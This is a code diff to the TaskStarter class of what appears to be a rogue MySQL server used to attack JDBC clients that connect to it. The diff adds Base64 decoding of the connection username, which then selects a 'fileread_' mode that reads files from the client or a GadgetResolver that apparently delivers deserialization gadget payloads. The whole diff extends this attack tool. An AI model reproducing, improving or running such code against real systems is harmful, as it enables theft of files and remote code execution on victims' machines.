@@ -8,6 +8,7 @@ import org.apache.logging.log4j.Logger;
 import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.util.Base64;
 import java.util.Objects;
 
 public class TaskStarter {
@@ -46,11 +47,21 @@ public class TaskStarter {
                     break;
                 }
 
-                if (frf.getUsername().startsWith("fileread_")) {
+                String username;
+                if (frf.getUsername().startsWith("base64")) {
+                    String baseData = frf.getUsername().substring(6);
+                    username = new String(Base64.getDecoder().decode(baseData));
+                    log.info("decode: {}", username);
+                    LogUtil.log("decode: " + username);
+                } else {
+                    username = frf.getUsername();
+                }
+
+                if (username.startsWith("fileread_")) {
                     log.info("mode: file read");
                     LogUtil.log("mode: file read");
                     ReadFileResolver rResolver = new ReadFileResolver(
-                            inputStream, outputStream, frf.getUsername());
+                            inputStream, outputStream, username);
                     rResolver.resolve();
                     break;
                 }
@@ -70,7 +81,7 @@ public class TaskStarter {
                     } else {
                         if (mysqlVersion != null && mysqlVersion.startsWith("8")) {
                             if (r.getStatement().toUpperCase().contains("SHOW SESSION STATUS")) {
-                                GadgetResolver resolver = new GadgetResolver(outputStream, frf.getUsername());
+                                GadgetResolver resolver = new GadgetResolver(outputStream, username);
                                 resolver.resolve();
                             } else {
                                 outputStream.write(Objects.requireNonNull(
@@ -78,7 +89,7 @@ public class TaskStarter {
                                 outputStream.flush();
                             }
                         } else {
-                            GadgetResolver resolver = new GadgetResolver(outputStream, frf.getUsername());
+                            GadgetResolver resolver = new GadgetResolver(outputStream, username);
                             resolver.resolve();
                         }
 
